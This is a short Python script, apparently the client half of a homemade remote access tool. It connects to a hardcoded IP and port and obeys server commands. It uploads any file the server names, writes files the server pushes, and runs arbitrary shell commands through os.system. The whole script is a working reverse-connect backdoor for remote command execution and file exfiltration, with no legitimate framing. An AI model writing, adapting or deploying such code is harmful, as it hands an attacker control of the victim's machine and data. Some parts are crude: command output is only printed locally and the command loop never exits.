import socket
import os

HEADER = 64
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = '!disconnect'

SERVER = '169.254.81.146'
PORT = 1234
ADDR = (SERVER, PORT)
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
def try_connection():
    client.connect(ADDR)

try_connection()
connection = True

def send_file():
    print('sending')
    file_name = client.recv(1024).decode()

    file = open(file_name, 'rb')
    f = file.read()
    client.send(f)
    file.close()

def recv_file():
    print('reciving')
    file_name = client.recv(1024).decode()
    file = client.recv(1024).decode()
    f = open(str(file_name), 'wt')
    f.write(file)
    f.close()

def cmd():
    active  = True
    while active:
        command = client.recv(1024).decode()
        if command == 'dir':
            b = os.listdir()
        elif command[:2] == 'cd':
            cd, di = command.split(' ')
            os.chdir(di) 
            b = 'changed'
        else:
            b = os.system(command)
        print(b) 

while connection:
    massage = client.recv(1024).decode()
    print(massage)

    if massage == 'send':
        recv_file()
    elif massage == 'recv':
        send_file()
    elif massage == 'cmd':
        cmd()
    elif massage == 'end':
            connection = False
            break
